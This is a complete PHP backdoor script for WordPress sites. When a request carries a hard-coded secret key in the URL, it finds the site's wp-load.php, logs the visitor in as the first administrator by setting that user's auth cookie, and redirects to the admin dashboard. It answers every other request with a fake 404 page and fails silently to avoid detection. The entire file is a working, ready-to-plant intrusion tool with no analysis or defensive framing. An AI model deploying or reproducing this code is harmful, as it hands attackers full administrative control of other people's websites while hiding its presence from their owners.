<?php

ob_start();

// ====== SECRET ACCESS KEY ====== //
$secret_key = 'aksesdewa';
// Change this to your desired secret key
// =============================== //

// Check if the secret key is provided in the URL
if (!isset($_GET['x']) || $_GET['x'] !== $secret_key) {
    // If not, show blank page (no output)
    header('HTTP/1.0 404 Not Found');
    exit; // Blank page, no output
}

function find_wp_load()
{
    $dir = dirname(__FILE__);
    $max_depth = 10;

    for ($i = 0; $i < $max_depth; $i++) {
        $path = $dir . str_repeat('/..', $i) . '/wp-load.php';

        if (file_exists($path)) {
            return realpath($path);
        }
    }

    $extra = [
        $dir . '/wp/wp-load.php',
        $dir . '/wordpress/wp-load.php',
        $dir . '/blog/wp-load.php'
    ];

    foreach ($extra as $path) {
        if (file_exists($path)) {
            return realpath($path);
        }
    }

    return false;
}

$wp_load_path = find_wp_load();

if ($wp_load_path) {

    require_once($wp_load_path);

    // Find first administrator user
    $admins = get_users([
        'role'   => 'administrator',
        'number' => 1
    ]);

    if (!empty($admins)) {

        $user = $admins[0];

        // Log in as this user
        wp_set_current_user(
            $user->ID,
            $user->user_login
        );

        wp_set_auth_cookie($user->ID);

        do_action(
            'wp_login',
            $user->user_login,
            $user
        );

        // Redirect to admin dashboard
        wp_redirect(admin_url());
        exit;

    } else {

        // Silent fail - blank page
        exit;
    }

} else {

    // Silent fail - blank page
    exit;
}

ob_end_flush();
?>
